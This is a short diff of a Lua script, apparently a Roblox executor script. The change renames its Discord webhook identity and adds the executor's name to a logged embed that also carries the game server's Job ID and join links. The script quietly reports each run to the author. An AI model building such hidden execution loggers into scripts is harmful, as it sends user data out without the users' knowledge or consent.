@@ -46,7 +46,8 @@ local http_request = request(
 		["Content-Type"] = "application/json"
 	},
 	Body = HttpService:JSONEncode({
-		username = "enzoe15226 execution logger",
+		username = "Executed The Script",
+		avatar_url = "https://cdn.discordapp.com/icons/1293964144529113138/e592a64d5170f7812bb5fd953323b8c5.webp?size=128",
 		content = "",
         embeds = {
             {
@@ -73,8 +74,8 @@ local http_request = request(
             {
                 title = "⚙️ Technical Details",
                 description = string.format(
-                    "**Job ID:** [Click to Copy](%s)\n**Mobile Join:** [Click](%s)",
-                    jobIdLink, mobileJoinLink
+                    "**Executor:** `%s`\n**Job ID:** [Click to Copy](%s)\n**Mobile Join:** [Click](%s)",
+                    executor, jobIdLink, mobileJoinLink
                 ),
                 color = tonumber("0x95a5a6"),
                 footer = { 
